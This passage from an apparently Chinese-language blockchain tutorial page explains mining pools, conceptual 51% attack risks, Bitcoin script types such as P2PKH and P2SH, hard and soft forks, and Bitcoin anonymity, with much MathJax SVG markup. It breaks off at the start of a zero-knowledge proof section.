-10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(944,0)\"/><path data-c=\"75\" d=\"M383 58Q327 -10 256 -10H249Q124 -10 105 89Q104 96 103 226Q102 335 102 348T96 369Q86 385 36 385H25V408Q25 431 27 431L38 432Q48 433 67 434T105 436Q122 437 142 438T172 441T184 442H187V261Q188 77 190 64Q193 49 204 40Q224 26 264 26Q290 26 311 35T343 58T363 90T375 120T379 144Q379 145 379 161T380 201T380 248V315Q380 361 370 372T320 385H302V431Q304 431 378 436T457 442H464V264Q464 84 465 81Q468 61 479 55T524 46H542V0Q540 0 467 -5T390 -11H383V58Z\" transform=\"translate(1333,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(1889,0)\"/><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\" transform=\"translate(2389,0)\"/><path data-c=\"20\" d=\"\" transform=\"translate(2667,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2917,0)\"/><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\" transform=\"translate(3306,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(3584,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(4417,0)\"/></g><g data-mml-node=\"mtext\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\"/><path data-c=\"78\" d=\"M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z\" transform=\"translate(444,0)\"/><path data-c=\"70\" d=\"M36 -148H50Q89 -148 97 -134V-126Q97 -119 97 -107T97 -77T98 -38T98 6T98 55T98 106Q98 140 98 177T98 243T98 296T97 335T97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 61 434T98 436Q115 437 135 438T165 441T176 442H179V416L180 390L188 397Q247 441 326 441Q407 441 464 377T522 216Q522 115 457 52T310 -11Q242 -11 190 33L182 40V-45V-101Q182 -128 184 -134T195 -145Q216 -148 244 -148H260V-194H252L228 -193Q205 -192 178 -192T140 -191Q37 -191 28 -194H20V-148H36ZM424 218Q424 292 390 347T305 402Q234 402 182 337V98Q222 26 294 26Q345 26 384 80T424 218Z\" transform=\"translate(972,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1528,0)\"/><path data-c=\"63\" d=\"M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z\" transform=\"translate(1972,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2416,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(2805,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(3249,0)\"/><path data-c=\"20\" d=\"\" transform=\"translate(3805,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(4055,0)\"/><path data-c=\"69\" d=\"M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z\" transform=\"translate(4444,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(4722,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(5555,0)\"/></g><rect width=\"4441.9\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span>还有阈值限制<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.781ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"5.191ex\" height=\"2.737ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -864.9 2294.2 1209.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mo\"><path data-c=\"5B\" d=\"M118 -250V750H255V710H158V-210H255V-250H118Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(278,0)\"><g data-mml-node=\"mn\" transform=\"translate(220,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"34\" d=\"M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z\"/></g><rect width=\"553.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(1071.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1516.2,0)\"><path data-c=\"34\" d=\"M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2016.2,0)\"><path data-c=\"5D\" d=\"M22 710V750H159V-250H22V-210H119V710H22Z\"/></g></g></g></svg></mjx-container></span>\n，为了防止异常情况下波动过大。</p>\n<h1 id=\"挖矿\">7 挖矿</h1>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250120103748329.png\" alt=\"image-20250120103748329\">\n<figcaption aria-hidden=\"true\">image-20250120103748329</figcaption>\n</figure>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250120103939365.png\" alt=\"image-20250120103939365\">\n<figcaption aria-hidden=\"true\">image-20250120103939365</figcaption>\n</figure>\n<p>挖矿设备：CPU → GPU → ASIC 芯片，专为比特币挖矿而设计的芯片</p>\n<h2 id=\"矿池\">7.1 矿池</h2>\n<p>一个全节点作为矿池管理员，分配需要计算的哈希值给大量矿工节点。</p>\n<p>那么如何分配矿工的收益？</p>\n<ul>\n<li>平均分配？不可行，这样鼓励偷懒了。</li>\n<li>按计算的哈希值数量分配？不可行，因为无法验证矿工是不是真的在挖矿（可能他说自己挖了很多哈希，但是其实根本没算）。</li>\n</ul>\n<p>解决方案：</p>\n<ul>\n<li>比如目标是挖70个0的区块，但是矿工挖出了60个0的区块就提交给矿主</li>\n<li>下面将70个0的区块称为合法区块；60个0的区块称为share区块</li>\n<li>矿主用挖出share区块数量来分配收益</li>\n</ul>\n<p>但是如果矿工挖出了合法区块不提交给矿主呢？</p>\n<p>不行，因为矿主分配给矿工的任务里，设置了coin base\ntx的收款地址是矿主。如果矿工修改了coin\nbase，尝试出来的share区块矿主就不接受了，和矿工自己挖没区别了。</p>\n<p>矿池的优点：降低了矿工的成本，稳定了收益，从而吸引更多的算力加入。</p>\n<p>矿池的危害：容易发动 51% 攻击。具体可以如何攻击：</p>\n<ul>\n<li><p>分叉攻击，主动分叉回滚区块</p></li>\n<li><p>不将某些交易上链。之前我们分析过恶意节点：</p>\n<blockquote>\n<p>能不能故意不把合法交易写入区块？可以，但是没用，总有诚实节点会发布这些交易，攻击者还少收了交易费。</p>\n</blockquote>\n<p>但是，如果这个恶意节点占据了51%以上的算力，一遇到某个交易就分叉攻击，其他矿工发现之后因为害怕自己的出块奖励被回滚，也会主动忽略这个交易。</p></li>\n</ul>\n<h1 id=\"比特币脚本\">8 比特币脚本</h1>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250120152100372.png\" alt=\"image-20250120152100372\">\n<figcaption aria-hidden=\"true\">image-20250120152100372</figcaption>\n</figure>\n<p>如果有多个输入脚本，每一个输入脚本都要和对应的输出脚本匹配之后验证，结果栈顶非零即为验证通过。</p>\n<h2 id=\"p2pkpay-to-public-key\">8.1 P2PK(Pay to Public Key)</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">input script:</span><br><span class=\"line\">\tPUSHDATA(Sig)</span><br><span class=\"line\">output script:</span><br><span class=\"line\">\tPUSHDATA(PubKey)</span><br><span class=\"line\">\tCHECKSIG</span><br></pre></td></tr></table></figure>\n<p>输出脚本直接给出收款人公钥。</p>\n<h2 id=\"p2pkhpay-to-public-key-hash\">8.2 P2PKH(Pay to Public Key\nHash)</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">input:</span><br><span class=\"line\">\tPUSHDATA(Sig)</span><br><span class=\"line\">\tPUSHDATA(PubKey)</span><br><span class=\"line\">output:</span><br><span class=\"line\">\tDUP  \t\t# 把栈顶元素复制一遍</span><br><span class=\"line\">\tHASH160   \t# 把栈顶元素弹出，取哈希后压回去</span><br><span class=\"line\">\tPUSHDATA(PubKeyHash)</span><br><span class=\"line\">\tEQUALVERIFY</span><br><span class=\"line\">\tCHECKSIG</span><br></pre></td></tr></table></figure>\n<p>输出脚本只给出收款人公钥的哈希。</p>\n<h2 id=\"p2shpay-to-script-hash\">8.3 P2SH(Pay to Script Hash)</h2>\n<p>redeem script，赎回脚本</p>\n<p>主要作用是实现<strong>多重签名</strong>的功能。</p>\n<p>比特币原生有多重签名的功能，但是有bug且不好用，需要买方在生成交易的时候在输出脚本里写入一堆指令，这堆指令的内容又需要向卖方获取。</p>\n<p>P2SH的目的就是用赎回脚本解耦，买方只需要在输入脚本里写上一个哈希校验，具体执行的脚本由卖方的输出脚本提供。</p>\n<h2 id=\"proof-of-burn\">8.4 Proof of Burn</h2>\n<p>输出脚本开头为\nRETURN，立刻终止返回非零值。也就是永远无法使用这个币。</p>\n<p>作用是销毁比特币。</p>\n<p>RETURN\n之后可以跟任意内容，永远不会被执行，但是会被记录在区块链里。</p>\n<p>这作用就是在区块链里持久化写入了一段内容。</p>\n<p>比特币的脚本语言是特别简单的脚本语言，很多复杂功能都不支持。目的是尽可能保证安全。比如不能循环就不可能出现死循环。</p>\n<p>以太坊的Solidity是图灵完备的。所以需要通过 gas 来防止陷入死循环。</p>\n<h1 id=\"分叉\">9 分叉</h1>\n<ul>\n<li>状态分叉（state fork）\n<ul>\n<li>分叉攻击（forking attack，deliberate fork）</li>\n</ul></li>\n<li>协议分叉（protocol fork），对更新的协议产生分歧\n<ul>\n<li>硬分叉</li>\n<li>软分叉</li>\n</ul></li>\n</ul>\n<h2 id=\"硬分叉\">9.1 硬分叉</h2>\n<p>以区块大小限制为例，默认区块限制是1M，假设现在更新到 4M。</p>\n<p>新节点知道区块大小更新到4M了，旧节点不知道。</p>\n<p>4M的区块被接入区块链之后，新节点就会找最长合法链继续挖，也就是接在 4M\n的区块后面。</p>\n<p>而旧节点认为 4M 的区块是不合法的，他还会继续挖 1M\n的区块，就产生了分叉。</p>\n<p>只要旧节点不更新软件，这个分叉就永远不会消失，因此叫做硬分叉。</p>\n<p>这样会导致社区分裂，一部分人认为 4M 的正确，一部分人认为 1M\n正确，最后就分家了，新的链上就有了新的币。以太坊上就发生过这样的事。</p>\n<p>为了区分这两条分叉后的链，才有了 Chain ID。</p>\n<h2 id=\"软分叉\">9.2 软分叉</h2>\n<p>以区块大小限制为例，默认区块限制是1M，假设现在更新到\n0.5M。（只是举例，实际上不太可能改小）</p>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-01/image-20250120161243656.png\" alt=\"image-20250120161243656\">\n<figcaption aria-hidden=\"true\">image-20250120161243656</figcaption>\n</figure>\n<p>旧节点不更新软件的化，旧节点挖出的区块都白挖了。</p>\n<p>但是系统不会有永久性的分叉。</p>\n<p>P2SH就是通过软分叉加进去的。</p>\n<h2 id=\"总结比较\">9.3 总结比较</h2>\n<p>硬分叉：</p>\n<ul>\n<li>必须要所有系统的节点都更新软件，才不会出现分叉</li>\n</ul>\n<p>软分叉：</p>\n<ul>\n<li>只要有超过51%算力的节点更新了软件，就不会永久出现分叉</li>\n</ul>\n<h1 id=\"比特币的匿名性\">10 比特币的匿名性</h1>\n<h2 id=\"基本分析\">10.1 基本分析</h2>\n<p>交易全部公开</p>\n<p>不同的账户之间可以通过关联的交易进行关联</p>\n<p>账户和真实世界的实体可以通过真实世界的转账行为进行关联</p>\n<p>本质上不匿名最大的问题在于交易的公开</p>\n<p>如何尽量提高匿名性……（TEE？</p>\n<ul>\n<li>网络层\n<ul>\n<li>多路径转发（洋葱路由，TOR），每个节点只知道上一个节点是谁，没办法回溯到最初发信人</li>\n</ul></li>\n<li>应用层\n<ul>\n<li>coin mixing，把你的身份和别人的身份混在一起</li>\n</ul></li>\n</ul>\n<h2 id=\"零知识证明\">10.2 零知识证明</h2>\n<h3 id=\"同态隐藏\">同态隐藏</h3>\n<ul>\n<li>如果 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.464ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.409ex\" height=\"1.464ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 1506.7 647\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(572,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1016.7,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span> 不同，他们的加密函数\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"10.386ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 4590.7 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(764,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1153,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1725,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2114,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2558.7,0)\"><path data-c=\"1D438\" d=\"M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3322.7,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3711.7,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 